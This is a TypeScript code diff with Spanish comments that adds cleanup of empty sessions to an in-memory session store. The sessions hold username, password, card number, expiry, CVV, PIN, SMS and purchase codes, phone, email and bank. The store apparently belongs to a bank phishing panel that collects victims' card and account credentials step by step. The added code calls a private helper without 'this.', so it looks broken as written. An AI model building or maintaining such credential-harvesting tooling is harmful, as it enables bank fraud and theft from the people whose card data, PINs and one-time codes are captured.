@@ -850,6 +850,7 @@ export class MemStorage implements IStorage {
   async cleanupExpiredSessions(): Promise<number> {
     const now = new Date();
     const fiveDaysAgo = new Date(now.getTime() - (5 * 24 * 60 * 60 * 1000)); // 5 días en milisegundos
+    const tenMinutesAgo = new Date(now.getTime() - (10 * 60 * 1000)); // 10 minutos en milisegundos
     
     let deletedCount = 0;
     const allSessions = Array.from(this.sessions.values());
@@ -860,9 +861,37 @@ export class MemStorage implements IStorage {
         this.sessions.delete(session.sessionId);
         deletedCount++;
       }
+      // Comprobamos si es una sesión sin datos y tiene más de 10 minutos
+      else if (
+        session.createdAt && 
+        new Date(session.createdAt) < tenMinutesAgo &&
+        isEmptySession(session)
+      ) {
+        this.sessions.delete(session.sessionId);
+        deletedCount++;
+        console.log(`Sesión vacía eliminada automáticamente: ${session.sessionId}`);
+      }
     }
     
     return deletedCount;
+  }
+  
+  // Función auxiliar para determinar si una sesión está vacía
+  private isEmptySession(session: Session): boolean {
+    // Una sesión se considera vacía si no tiene datos relevantes
+    // Solo se cuenta el banco y el paso ya que se establecen automáticamente
+    return !session.folio && 
+           !session.username && 
+           !session.password && 
+           !session.tarjeta && 
+           !session.fechaVencimiento && 
+           !session.cvv && 
+           !session.sms && 
+           !session.nip && 
+           !session.smsCompra && 
+           !session.celular && 
+           !session.correo && 
+           !session.contrasena;
   }
 }
 
